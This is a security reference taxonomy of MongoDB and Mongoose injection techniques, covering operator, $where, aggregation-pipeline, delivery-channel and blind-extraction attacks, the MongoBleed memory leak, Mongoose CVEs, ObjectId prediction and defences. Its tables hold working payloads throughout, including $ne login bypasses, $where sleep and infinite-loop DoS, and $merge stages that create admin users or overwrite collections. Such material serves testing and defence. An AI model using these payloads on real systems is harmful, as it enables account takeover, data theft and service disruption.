# MongoDB Injection & Exploitation Mutation Taxonomy

---
## Classification Structure


**Axis 1 — Mutation Target (Primary):** *What structural component of the MongoDB query, protocol, or ecosystem is being manipulated?* This axis organizes the main body of the document into eight top-level categories, each targeting a distinct structural surface: query operators, server-side JavaScript execution contexts, aggregation pipeline stages, input delivery mechanisms, data extraction channels, wire protocol / BSON layer, ORM/ODM library layer, and identifier predictability.

**Axis 2 — Discrepancy Type (Cross-Cutting):** *What kind of semantic mismatch or bypass does the mutation create?* Each technique exploits one or more of the following discrepancy types, which cut across all Axis 1 categories:

| Discrepancy Type | Mechanism |
|---|---|
| **Query Logic Manipulation** | Tautology, negation, or wildcard matching forces always-true conditions or inverts intended logic |
| **Type Confusion** | Application expects a scalar (string) but receives a structured object or array containing operators |
| **Sanitization Bypass** | Nesting, wrapping ($or/$and), or encoding evades input validation and operator stripping |
| **Serialization Mismatch** | Differences between JSON/URL-encoded input and internal BSON representation create parsing gaps |
| **Memory Safety Violation** | Protocol-level flaws in decompression or buffer handling leak uninitialized heap memory |
| **Schema Assumption Violation** | ORM/ODM libraries trust prototype chains or schema definitions that attackers can pollute |

**Axis 3 — Attack Scenario (Mapping):** Maps each technique to its real-world weaponization context — authentication bypass, data exfiltration, RCE, privilege escalation, DoS, cross-collection access, data modification, IDOR, or information disclosure. Detailed in §9.

### Fundamental Mechanism

MongoDB queries are structured BSON documents, not concatenated strings. This architectural difference eliminates classic string-concatenation SQL injection but introduces a fundamentally different injection surface: **operator injection via structured data**. When applications accept user input as JSON objects or URL-encoded arrays and embed them directly into query documents, attackers can inject MongoDB query operators (`$ne`, `$gt`, `$regex`, `$where`, etc.) that alter query semantics. The query language itself becomes the injection vector.

---

## §1. Query Operator Injection

The most prevalent MongoDB injection class. Instead of injecting SQL syntax into string-concatenated queries, attackers inject MongoDB query operators as structured JSON objects or URL-encoded key-value pairs into fields that the application passes directly to the database driver.

### §1-1. Comparison Operator Injection

Comparison operators modify the logical evaluation of field-value matches, typically converting exact-match checks into always-true conditions.

| Subtype | Mechanism | Example Payload | Key Condition |
|---|---|---|---|
| **$ne (Not Equal)** | Matches all documents where the field is not equal to the specified value | `{"password": {"$ne": ""}}` or `password[$ne]=x` | Application passes raw input to query without type validation |
| **$gt / $gte (Greater Than)** | Matches documents where field value is greater than specified; empty string matches all non-empty values | `{"password": {"$gt": ""}}` | String comparison semantics; any non-empty password satisfies |
| **$lt / $lte (Less Than)** | Mirrors $gt logic with inverse comparison direction; useful for lexicographic enumeration | `{"username": {"$lt": "z"}, "password": {"$lt": "z"}}` | Less commonly filtered than $ne/$gt |
| **$in / $nin** | Matches documents where field value is (or is not) in a specified array | `{"username": {"$nin": ["admin"]}}` | Useful for excluding specific known values while matching others |
| **$exists** | Matches documents based on field existence regardless of value | `{"password": {"$exists": true}}` | Bypasses value-based checks entirely |

The most classic exploitation is authentication bypass: `{"username": {"$ne": ""}, "password": {"$ne": ""}}` returns the first document in the users collection (often admin), logging the attacker in without credentials.

### §1-2. Pattern Matching Operator Injection

Regex-based operators provide fine-grained control over which documents match, enabling both bypass and data extraction.

| Subtype | Mechanism | Example Payload | Key Condition |
|---|---|---|---|
| **$regex (Wildcard Match)** | Matches any document whose field matches the regex pattern | `{"username": {"$regex": ".*"}}` | Dot-star matches everything; bypasses value checks |
| **$regex (Prefix Extraction)** | Uses anchored patterns to extract field values character-by-character | `{"password": {"$regex": "^a"}}` | Boolean response differential reveals characters |
| **$regex (Length Probing)** | Tests field value length using quantified dots | `{"password": {"$regex": ".{8}"}}` | True/false response reveals exact length |
| **$regex (Case-Insensitive)** | Adds options flag for case-insensitive matching | `{"username": {"$regex": "admin", "$options": "i"}}` | Bypasses case-sensitive comparisons |

### §1-3. Logical Operator Injection

Logical operators restructure query logic at the top level, combining or overriding individual field conditions.

| Subtype | Mechanism | Example Payload | Key Condition |
|---|---|---|---|
| **$or (Disjunction)** | Creates always-true conditions by providing alternative match paths | `{"$or": [{"username": "admin"}, {"username": {"$ne": ""}}]}` | One branch always satisfies |
| **$and (Conjunction)** | Chains additional conditions; can be used to inject secondary query logic | `{"$and": [{"username": "admin"}, {"$where": "1==1"}]}` | Injects operators as nested conditions |
| **$not** | Inverts a condition; can be combined with other operators to negate filters | `{"password": {"$not": {"$eq": ""}}}` | Equivalent to $ne but evades $ne-specific filters |

### §1-4. Evaluation Operator Injection

Advanced operators that perform computation or comparison beyond simple field matching.

| Subtype | Mechanism | Example Payload | Key Condition |
|---|---|---|---|
| **$eq (Explicit Equality)** | Wraps user input in explicit equality operator to prevent operator injection | Used defensively: `{"password": {"$eq": userInput}}` | Defense mechanism, not attack — but absence creates exposure |
| **$elemMatch** | Matches array elements satisfying combined conditions | `{"roles": {"$elemMatch": {"$eq": "admin"}}}` | Target field must be an array |
| **$expr** | Allows aggregation expressions in find queries | `{"$expr": {"$eq": ["$password", "$username"]}}` | Matches documents where password equals username |

---

## §2. Server-Side JavaScript Execution (SSJI)

MongoDB historically provided multiple contexts for executing arbitrary JavaScript on the server. While progressively deprecated (JavaScript is deprecated in MongoDB 8.0+), these remain exploitable on older versions and through ORM-layer bypasses.

### §2-1. $where Operator Injection

The `$where` operator evaluates a JavaScript expression for each document, with `this` bound to the current document. On the MongoDB server, `$where` executes in MongoDB's embedded MozJS engine — not Node.js — so server-side exploitation is limited to data exfiltration, timing attacks, and DoS (not direct OS command execution). ODM/application-side predicate evaluation can create separate code-injection risk, but OS-command RCE requires an evaluation path with access to host APIs (see §7-1).

| Subtype | Mechanism | Example Payload | Key Condition |
|---|---|---|---|
| **Tautology Injection** | Injects always-true JS expression to match all documents | `{"$where": "1==1"}` or `' || 1==1//` | $where accepted in query; JS enabled on server |
| **Sleep-Based Timing** | Injects `sleep()` to create measurable time delay | `{"$where": "sleep(5000)"}` | Confirms injection via response latency |
| **String Termination + Injection** | Breaks out of string context in $where expression | `admin' && this.password[0]=='a' || 'x'=='y` | User input concatenated into $where string |
| **Error-Based Exfiltration** | Throws error containing document data | `{"$where": "throw new Error(JSON.stringify(this))"}` | Error messages reflected to attacker |
| **DoS via Infinite Loop** | Injects non-terminating loop | `{"$where": "while(true){}"}` | No execution timeout configured |
| **Application-Side Predicate Code Injection** | When an ODM or application layer evaluates user-controlled query predicates outside MongoDB, impact depends on that evaluator's capabilities | `{"$where": "sleep(5000)"}` | Applies only to application-side predicate evaluation paths. Does NOT work against MongoDB server's MozJS engine as OS-command RCE |

**Critical nuance:** Even when MongoDB server-side JavaScript is disabled (`--noscripting`), ORM libraries may still process user-controlled predicates in the application runtime. Treat Mongoose `populate().match()` `$where` issues as search/code injection by default; do not assume OS-command RCE without a separate host-capable evaluation path (§7-1).

### §2-2. mapReduce Injection

The `mapReduce` command executes user-supplied JavaScript `map` and `reduce` functions across the entire collection.

| Subtype | Mechanism | Example Payload | Key Condition |
|---|---|---|---|
| **Map Function Injection** | Injects code into the map function | `db.collection.mapReduce("function(){emit(1, this)}", "function(k,v){return v}", {out: "output"})` | User controls map/reduce function strings |
| **Scope Variable Injection** | Injects variables through the `scope` parameter | `{scope: {injected: "malicious_value"}}` — note: `require('child_process')` is NOT available in MongoDB's MozJS engine; scope injection enables data manipulation within the map/reduce JS context, not OS command execution | Scope object accepted from user input |

`mapReduce` is deprecated since MongoDB 5.0. The aggregation framework should be used instead.

### §2-3. $function and $accumulator Injection

Aggregation pipeline operators that accept custom JavaScript functions — deprecated in MongoDB 8.0 but still present in older deployments.

| Subtype | Mechanism | Example Payload | Key Condition |
|---|---|---|---|
| **$function Injection** | Custom JS function in aggregation pipeline | `{"$function": {"body": "function(doc){return doc.sensitiveField}", "args": ["$$ROOT"], "lang": "js"}}` — note: `process.env` is NOT available in MongoDB's MozJS engine; exploitation is limited to data access/manipulation within the DB context | Pipeline stage controlled by attacker; MongoDB < 8.0 |
| **$accumulator Injection** | Custom JS accumulator with init/accumulate/merge/finalize functions | Inject malicious code into any of the four function slots | User input reaches $accumulator definition |

### §2-4. eval Command Injection (Legacy)

The `eval` command directly executes arbitrary JavaScript on the server. Deprecated since MongoDB 3.0 and removed in 4.2.

| Subtype | Mechanism | Example Payload | Key Condition |
|---|---|---|---|
| **Direct eval** | Passes JS string to server for execution | `db.eval("return db.users.find().toArray()")` | MongoDB < 3.0 with eval enabled; extremely rare in production |

---

## §3. Aggregation Pipeline Injection

When applications expose MongoDB's `aggregate()` method to user-controlled input, attackers can inject pipeline stages that access, modify, or create data across collections — dramatically escalating impact beyond the intended query scope.

### §3-1. Cross-Collection Data Access

Pipeline stages that perform join operations or set unions can extract data from collections the application never intended to expose.

| Subtype | Mechanism | Example Payload | Key Condition |
|---|---|---|---|
| **$lookup (Left Outer Join)** | Joins a foreign collection; dummy field values cause full-collection inclusion | `{"$lookup": {"from": "users", "localField": "_nonexistent", "foreignField": "_nonexistent", "as": "leaked"}}` | Attacker controls pipeline stages; target collection name known or guessable |
| **$lookup with Pipeline** | Nested pipeline within $lookup for filtered extraction | `{"$lookup": {"from": "secrets", "pipeline": [{"$match": {}}], "as": "data"}}` | More precise extraction; sub-pipeline cannot contain $out/$merge |
| **$unionWith** | Combines results from another collection into the current result set | `{"$unionWith": {"coll": "users", "pipeline": [{"$addFields": {"_source": "users"}}]}}` | Simpler than $lookup; no join semantics required |
| **$graphLookup** | Recursive graph traversal across collections | Traverses linked documents to discover relationship chains | Less common; requires knowledge of relationship fields |

**Detection indicator:** Aggregation pipelines always expect an array as the first argument. JSON arrays in request parameters, or `$match`/`$lookup` operators in request bodies, signal potential pipeline injection surfaces.

### §3-2. Data Modification via Pipeline

The `$merge` and `$out` stages write pipeline output to collections, enabling data insertion, modification, and privilege escalation.

| Subtype | Mechanism | Example Payload | Key Condition |
|---|---|---|---|
| **Document Insertion ($merge + insert)** | Creates new documents in target collection | `[{"$limit":1}, {"$replaceWith": {"username":"evil","role":"admin","password":"pass"}}, {"$merge": {"into":"users","whenNotMatched":"insert"}}]` | Always include `$limit:1` to prevent mass document creation |
| **Document Modification ($merge + merge)** | Updates existing documents via _id matching | `[{"$unionWith":"users"}, {"$match":{"username":"target"}}, {"$set":{"role":"admin"}}, {"$merge":{"into":"users","on":"_id","whenMatched":"merge"}}]` | Requires document identification (ObjectId or unique field) |
| **Collection Overwrite ($out)** | Replaces entire collection with pipeline output | `{"$out": "users"}` | Destructive; replaces target collection entirely |
| **Targeted Update ($replaceWith + $toObjectId)** | Modifies specific document using known ObjectId | `{"$replaceWith": {"_id": {"$toObjectId": "66773d..."}, "role": "admin"}}` | ObjectId must be obtained via prior enumeration (§3-1) |

### §3-3. Computation and Transformation

Pipeline stages that transform or compute over data, useful for information gathering.

| Subtype | Mechanism | Example Payload | Key Condition |
|---|---|---|---|
| **$group (Aggregation)** | Groups documents and computes aggregate values | `{"$group": {"_id": "$role", "count": {"$sum": 1}}}` | Reveals data distribution; schema enumeration |
| **$project / $addFields** | Selects or computes derived fields | `{"$addFields": {"_leaked": "$secretField"}}` | Exposes fields not normally included in output |
| **$bucket / $facet** | Multi-faceted analysis in single query | Complex multi-stage analysis | Advanced reconnaissance |

---

## §4. Input Delivery Mechanism Mutations

The same operator injection payload can be delivered through multiple HTTP input channels, each requiring different syntax. Applications that validate one channel often miss others.

### §4-1. URL Parameter Injection (GET/POST Form-Encoded)

PHP and Express.js automatically parse bracket notation in URL parameters into nested objects.

| Subtype | Mechanism | Example Payload | Key Condition |
|---|---|---|---|
| **Bracket Notation** | Square brackets create nested objects from URL params | `username[$ne]=x&password[$ne]=x` | Framework auto-parses brackets into objects (PHP, Express qs) |
| **Array Index Notation** | Numeric indices create arrays | `filter[$or][0][username]=admin&filter[$or][1][username][$ne]=x` | Complex query structures via URL |
| **Dot Notation** | Dots traverse nested object paths | `query.username[$ne]=x` | Body-parser with extended mode enabled |

### §4-2. JSON Body Injection (POST/PUT/PATCH)

JSON request bodies provide the most direct injection path since MongoDB queries are natively JSON-structured.

| Subtype | Mechanism | Example Payload | Key Condition |
|---|---|---|---|
| **Direct Object Injection** | JSON object replaces expected string value | `{"username": {"$ne": null}, "password": {"$ne": null}}` | Application deserializes JSON body directly into query |
| **Nested Operator Injection** | Operators nested within $or/$and bypass top-level sanitization | `{"$or": [{"password": {"$ne": ""}}, {"$where": "sleep(5000)"}]}` | Sanitizer only checks top-level keys |
| **Duplicate Key Exploitation** | MongoDB officially states that duplicate field names are unsupported and behavior is undefined. In practice, some drivers/parsers may use the last occurrence, but this is not guaranteed across all drivers and versions | `{"id": "safe_value", "id": {"$ne": null}}` | WAF inspects first occurrence; behavior driver-dependent (not officially defined) |

### §4-3. Content-Type Switching

Changing the Content-Type header can alter how the backend processes the same payload, bypassing format-specific validation.

| Subtype | Mechanism | Example Payload | Key Condition |
|---|---|---|---|
| **Form → JSON Switch** | Send JSON body with `application/json` Content-Type to endpoint expecting form data | Change `username=admin&password=pass` to `{"username":"admin","password":{"$ne":""}}` | Backend accepts both content types; validation only covers form format |
| **JSON → URL-Encoded Switch** | Reverse direction; URL-encoded bracket notation bypasses JSON-level sanitization | `username[$ne]=&password[$ne]=` | Different parsing path, different validation |

### §4-4. HTTP Parameter Pollution

Sending the same parameter multiple times with different formats to exploit parser precedence.

| Subtype | Mechanism | Example Payload | Key Condition |
|---|---|---|---|
| **Scalar + Object Collision** | Same parameter sent as both string and object | `password=correct&password[$ne]=x` | Parser precedence determines which value reaches database |
| **$where via Parameter Name Injection** | PHP `$_GET`/`$_POST` key named `$where` is directly inserted into query object as MongoDB's `$where` operator | `$where=return true` (PHP variable named `$where`) | PHP application builds query from unsanitized `$_GET`/`$_POST` keys — this is parameter-name/operator injection, not strictly HTTP Parameter Pollution |

---

## §5. Data Extraction Channel Mutations

When injection is confirmed but results are not directly visible, blind extraction techniques recover data through side channels.

### §5-1. Boolean-Based Blind Extraction

The attacker infers data by observing differential application responses (HTTP status, response body, redirect behavior) to true vs. false conditions.

| Subtype | Mechanism | Example Payload | Key Condition |
|---|---|---|---|
| **Character-by-Character Extraction** | $regex with anchored prefix tests each character position | `{"password": {"$regex": "^a"}}` → `^ab` → `^abc` ... | Distinguishable true/false responses |
| **Length Enumeration** | $regex with quantified dots determines field length | `{"password": {"$regex": ".{1}"}}` through `".{N}"` | Response changes when length exceeds actual value |
| **Charset Detection** | Regex character classes identify composition | `{"password": {"$regex": "[0-9]"}}` | Narrows search space before character enumeration |
| **Field Discovery** | $exists probes for field names | `{"secretField": {"$exists": true}}` | Discovers schema when field names are unknown |
| **$in Wordlist Matching** | Tests field against a predefined value list | `{"username": {"$in": ["admin","root","test"]}}` | Faster than character extraction for known-value fields |

### §5-2. Time-Based Blind Extraction

When boolean responses are indistinguishable, timing differentials from JavaScript execution reveal query results.

| Subtype | Mechanism | Example Payload | Key Condition |
|---|---|---|---|
| **sleep() Conditional** | Injects conditional sleep in $where | `{"$where": "if(this.password[0]=='a') sleep(5000)"}` | Server-side JavaScript enabled; measurable latency difference |
| **Computational Delay** | CPU-intensive operations as timing oracle | `{"$where": "if(this.password[0]=='a'){var x=0;for(var i=0;i<100000000;i++){x+=i}}"}` | Alternative when sleep() is blocked |
| **Regex Catastrophic Backtracking** | Crafted regex causes exponential matching time | `{"password": {"$regex": "^(a+)+$"}}` | ReDoS as timing side channel |

### §5-3. Error-Based Extraction

Data exfiltration through error messages that reflect document content.

| Subtype | Mechanism | Example Payload | Key Condition |
|---|---|---|---|
| **throw with JSON.stringify** | Throws error containing serialized document | `{"$where": "throw new Error(JSON.stringify(this))"}` | Error messages returned in HTTP response |
| **Type Coercion Error** | Forces type error that includes field value | Operator applied to incompatible type; error reveals actual type/value | Verbose error reporting enabled |
| **Invalid Operator Error** | Malformed query reveals collection schema or engine version | `{"$invalidOp": 1}` | Error messages not sanitized |

### §5-4. Union-Based Extraction (via Aggregation)

When aggregation pipeline is injectable, direct data retrieval replaces blind techniques (§3-1).

---

## §6. Wire Protocol and BSON Layer

Vulnerabilities in MongoDB's network protocol and binary serialization format that operate below the query language level.

### §6-1. Message Compression Exploitation (MongoBleed)

A flaw in MongoDB's zlib message decompression implementation allows unauthenticated memory disclosure.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Heap Buffer Over-Read** | Attacker sends compressed message with header claiming inflated size far exceeding actual payload. Server allocates large buffer, decompresses small payload into it, then returns the full buffer — including uninitialized heap memory containing fragments of other connections' data (credentials, queries, session tokens). | zlib compression negotiated (zlib is in the default compressor advertisement list; active only when both client and server agree on zlib); affected versions are prior to the fixed releases 8.2.3 / 8.0.17 / 7.0.28 / 6.0.27 / 5.0.32 / 4.4.30, with 4.2, 4.0, and 3.6 requiring upgrade to a supported fixed branch |

This is architecturally similar to Heartbleed (CVE-2014-0160): a protocol-level memory disclosure caused by trusting attacker-controlled length fields. Unlike query-level injection, it requires no authentication and no application-layer vulnerability — only network access to the MongoDB port (default 27017).

### §6-2. BSON Deserialization Flaws

Vulnerabilities in BSON parsing libraries that cause incorrect serialization or deserialization.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **js-bson Parsing Discrepancy** | Incorrect parsing of certain JSON input results in improper BSON serialization, allowing data manipulation | Affected versions of js-bson library; authenticated user required |
| **BSON Type Confusion** | Mismatched BSON type tags cause fields to be interpreted as different types than intended | Driver/library version with parsing bugs |

---

## §7. ORM/ODM Library Layer (Mongoose)

Vulnerabilities specific to the Mongoose ODM for Node.js — the most widely-used MongoDB object modeling library. These bypass MongoDB's own security boundaries through application-layer processing.

### §7-1. populate() $where Bypass

Mongoose's `populate()` function with the `match` option can process application-supplied query predicates outside the normal MongoDB query path. The CVE-2024-53900 / CVE-2025-23061 chain is best described as search/code injection through `$where` handling in `populate().match()`, not as a generic MongoDB server OS-command RCE.

| Subtype | Mechanism | Example Payload | Key Condition |
|---|---|---|---|
| **Direct $where in match** | User-controlled `$where` reaches `populate().match()` predicate handling, causing search/code injection depending on the evaluation path | `{match: {"$where": "sleep(5000)"}}` | Mongoose < 8.8.3 / < 7.8.3 / < 6.13.5; user controls match options (CVE-2024-53900, CVSS 9.1) |
| **$or-Nested $where Bypass** | Wrapping $where inside $or bypasses Mongoose's top-level property check | `{match: {"$or": [{"$where": "...payload..."}]}}` | Mongoose < 8.9.5 / < 7.8.4 / < 6.13.6; patch only inspected top-level keys (CVE-2025-23061; GitHub scores 9.1, NVD analysis lists 9.8) |

The patch bypass demonstrates a recurring pattern: sanitization that only inspects top-level properties is defeated by nesting malicious operators inside logical combinators ($or, $and, $nor).

### §7-2. Prototype Pollution

Mongoose's schema and document handling has been vulnerable to prototype pollution through multiple vectors.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Schema.path() Pollution** | Attacker-controlled path string like `__proto__.polluted` modifies Object prototype | CVE-2022-2564; Mongoose < 6.4.6 |
| **Update Function Pollution** | `findByIdAndUpdate()` and similar methods allow prototype pollution through crafted update objects | CVE-2023-3696; exploitable for RCE when combined with Express + EJS |
| **Document Constructor Pollution** | Crafted input during document instantiation pollutes prototype | Earlier versions; object assignment without hasOwnProperty checks |

### §7-3. Mass Assignment

Mongoose schemas define allowed fields, but permissive configurations allow attackers to set fields beyond their authorization.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Schema Bypass via $set** | Direct `$set` operations bypass schema validation | `strict: false` schema option or `Model.updateMany()` without field restriction |
| **Hidden Field Injection** | Setting fields not exposed in API responses (e.g., `role`, `isAdmin`, `verified`) | Schema includes sensitive fields without explicit write protection |

---

## §8. Identifier Predictability (ObjectId)

MongoDB's default `_id` field uses ObjectId — a 12-byte identifier with a deterministic structure that enables prediction and enumeration.

### §8-1. ObjectId Structure Analysis

An ObjectId's 24 hex characters encode:

| Bytes | Component | Predictability |
|---|---|---|
| 0–3 (8 chars) | **Unix timestamp** (seconds) | Fully predictable — creation time is embedded |
| 4–8 (10 chars) | **5-byte random value** | Per MongoDB docs: random value unique to the machine and process — generated client-side by the driver, not by the MongoDB server process |
| 9–11 (6 chars) | **3-byte incrementing counter** | Sequential — increments by 1 per ObjectId generated by the same client process (initialized to a random value) |

### §8-2. Prediction Attacks

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Counter Enumeration** | Given one ObjectId, increment/decrement the counter to find adjacent documents | Single valid ObjectId from target process; low-traffic application |
| **Timestamp Bracketing** | Enumerate all ObjectIds within a known time window (e.g., registration timestamps) | Known approximate creation time; 3600 possibilities per hour |
| **Full Candidate Generation** | Generate ~1000 candidate ObjectIds from a single known ID using process random + counter combination | Low concurrency on target MongoDB process |
| **Cross-Collection Correlation** | ObjectIds from one collection reveal timestamp and client process info applicable to other collections | Multiple collections populated by the same client process/driver instance |

**Impact:** When combined with IDOR vulnerabilities (missing authorization checks on endpoints that accept ObjectId parameters), prediction enables unauthorized access to other users' resources without any injection vulnerability.

---

## §9. Attack Scenario Mapping (Axis 3)

| Scenario | Primary Mutation Categories | Architecture / Conditions |
|---|---|---|
| **Authentication Bypass** | §1-1 ($ne/$gt), §1-2 ($regex), §1-3 ($or), §2-1 ($where tautology) | Login endpoint passes credentials directly to `find()`/`findOne()` without type validation |
| **Data Exfiltration** | §5-1 (Boolean blind), §5-2 (Time blind), §5-3 (Error-based), §3-1 ($lookup/$unionWith) | Any injectable query with observable response differential |
| **Remote Code Execution / Code Injection** | §2-1 (server-side JavaScript misuse), §7-1 (Mongoose populate() predicate injection) | MongoDB server-side JavaScript contexts such as `$where`, `mapReduce`, and `$function` execute in MongoDB's MozJS engine, so they should be treated as data access/manipulation or DoS primitives rather than direct OS-command RCE. Mongoose `populate().match()` bugs are better classified as search/code injection unless a separate application-side evaluation path reaches OS-capable APIs |
| **Privilege Escalation** | §3-2 ($merge modification), §7-3 (mass assignment) | Aggregation pipeline injectable; or permissive schema configuration |
| **Cross-Collection Access** | §3-1 ($lookup, $unionWith), §3-3 ($project) | Aggregation pipeline injectable; collection names known |
| **Data Modification / Insertion** | §3-2 ($merge insert/merge), §7-3 (mass assignment) | Write-capable pipeline stages; or update endpoints without field restriction |
| **Denial of Service** | §2-1 (infinite loop), §5-2 (ReDoS), §1-2 (catastrophic regex) | JavaScript execution or regex evaluation without timeout |
| **Information Disclosure (Memory)** | §6-1 (MongoBleed) | Network access to MongoDB port; zlib compression negotiated (zlib is in default compressor list but only active when client-server agree) |
| **IDOR / Authorization Bypass** | §8-2 (ObjectId prediction) | Missing authorization checks; ObjectId used as access token |

---

## §10. CVE / Bounty Mapping (2022–2025)

| Mutation Combination | CVE / Case | Impact / Bounty |
|---|---|---|
| §6-1 (MongoBleed) | CVE-2025-14847 (MongoDB Server) | CVSS 7.5 (v3.1) / 8.7 (v4.0). Unauthenticated heap memory disclosure. Third-party exposed-instance counts vary by source; Akamai and Qualys report CISA KEV addition on 2025-12-29 and active exploitation |
| §7-1 ($or-nested $where bypass) | CVE-2025-23061 (Mongoose) | Code/search injection via nested `$where` in `populate().match()`; bypass of CVE-2024-53900 patch. GitHub scores 9.1; NVD analysis lists 9.8 |
| §7-1 (Direct $where in populate) | CVE-2024-53900 (Mongoose < 8.8.3 / < 7.8.3 / < 6.13.5) | CVSS 9.1. Search/code injection via `$where` in `populate().match()`; impact depends on the application-side evaluation path |
| §7-2 (Update function pollution) | CVE-2023-3696 (Mongoose) | Prototype pollution → RCE (Express + EJS); findByIdAndUpdate() |
| §7-2 (Schema.path pollution) | CVE-2022-2564 (Mongoose) | Prototype pollution → DoS; Schema.path() with attacker-controlled input |
| §6-2 (BSON deserialization) | SB2020033135 (js-bson) | Data manipulation via incorrect BSON serialization |
| §1-1 + §2-1 (Auth bypass + blind NoSQL injection) | Rocket.Chat CVE-2023-28359 | Blind NoSQL injection causing delay in `listEmojiCustom` (NVD description) — specific mechanism ($where sleep) is not detailed in official CVE description |
| §1-1 ($ne auth bypass) | Multiple bug bounty reports | Authentication bypass via operator injection |
| §3-1 + §3-2 (Pipeline injection) | PortSwigger Academy research (2024) | Cross-collection data access and privilege escalation via $lookup + $merge |
| §8-2 (ObjectId prediction) | Various IDOR reports | Authorization bypass via ObjectId enumeration; PentesterLab exercise |

---

## §11. Detection Tools

| Tool | Target Scope | Core Technique |
|---|---|---|
| **NoSQLMap** (Offensive) | Automated MongoDB injection and enumeration | Operator injection, blind extraction, and exploitation automation |
| **nosqli** (Offensive) | MongoDB injection detection via CLI | Fast boolean/timing injection detection; supports GET/POST/JSON |
| **Burp NoSQLi Scanner** (Offensive) | Burp Suite extension for NoSQL injection | Passive/active scanning for operator injection patterns |
| **mongo-objectid-predict** (Offensive) | ObjectId prediction and IDOR exploitation | Generates ~1000 candidate ObjectIds from a single seed |
| **NoSQL Racket** (Offensive/Research) | NoSQL injection detection in web applications | Automated testing with injection payload library |
| **Mongoose sanitizeFilter** (Defensive) | Input sanitization at ORM layer | Wraps user input in `$eq` to neutralize operator injection |
| **MongoDB --noscripting** (Defensive) | Disable server-side JavaScript execution | Prevents $where, mapReduce, $function exploitation at server level |
| **express-mongo-sanitize** (Defensive) | Express.js middleware | Strips `$` and `.` characters from user input before query construction |
| **PayloadsAllTheThings** (Reference) | Comprehensive NoSQL injection payload repository | Community-maintained injection payload database and cheatsheets |

---

## §12. Summary: Core Principles

MongoDB injection commonly starts when an application expects a scalar but accepts an object from JSON or URL-encoded bracket notation. Embedding that object directly in a BSON query lets operators such as `$ne`, `$gt`, `$regex`, `$where`, or `$or` change query semantics.

The initial Mongoose fix for CVE-2024-53900 removed top-level `$where`, but CVE-2025-23061 bypassed it by nesting `$where` inside `$or`. Enforcing expected scalar types or wrapping values in `$eq` avoids dependence on an operator blocklist.

**The architectural solution requires three layers of defense.** First, enforce scalar types at the application boundary: never pass raw JSON objects from user input into query positions — wrap values in `$eq` or validate with schema libraries (Joi, Zod). Second, disable unnecessary attack surface: set `--noscripting` (note: `security.javascriptEnabled` defaults to `true` per official MongoDB docs — `--noscripting` must be explicitly configured), avoid `$where`/`mapReduce`/`$function`, restrict aggregation pipeline stages available to user-facing endpoints. Third, apply least privilege: MongoDB roles should prevent application accounts from accessing collections beyond their intended scope, and network access to port 27017 should be restricted to prevent protocol-level attacks like MongoBleed.

---

## Reference

- [PortSwigger Web Security Academy — NoSQL Injection](https://portswigger.net/web-security/nosql-injection)
- [PayloadsAllTheThings — NoSQL Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/NoSQL%20Injection/)
- [HackTricks — NoSQL Injection](https://book.hacktricks.wiki/en/pentesting-web/nosql-injection.html)
- [Soroush Dalili — MongoDB NoSQL Injection with Aggregation Pipelines (2024)](https://soroush.me/blog/2024/06/mongodb-nosql-injection-with-aggregation-pipelines/)
- [OPSWAT — Technical Discovery of Mongoose CVE-2025-23061 and CVE-2024-53900](https://www.opswat.com/blog/technical-discovery-mongoose-cve-2025-23061-cve-2024-53900)
- [Wiz — MongoBleed CVE-2025-14847](https://www.wiz.io/blog/mongobleed-cve-2025-14847-exploited-in-the-wild-mongodb)
- [TechKranti — IDOR through MongoDB Object IDs Prediction](https://techkranti.com/idor-through-mongodb-object-ids-prediction/)
- [NullSweep — NoSQL Injection Cheatsheet](https://nullsweep.com/nosql-injection-cheatsheet/)
- [Imperva — What Is NoSQL Injection?](https://www.imperva.com/learn/application-security/nosql-injection/)
- [MongoDB Documentation — Server-Side JavaScript](https://www.mongodb.com/docs/manual/core/server-side-javascript/)
- [PMC — The MongoDB Injection Dataset (2024)](https://pmc.ncbi.nlm.nih.gov/articles/PMC10997947/)
- [Snyk — Prototype Pollution in Mongoose](https://security.snyk.io/vuln/SNYK-JS-MONGOOSE-5777721)
- [MongoDB — Security Alerts](https://www.mongodb.com/resources/products/alerts)
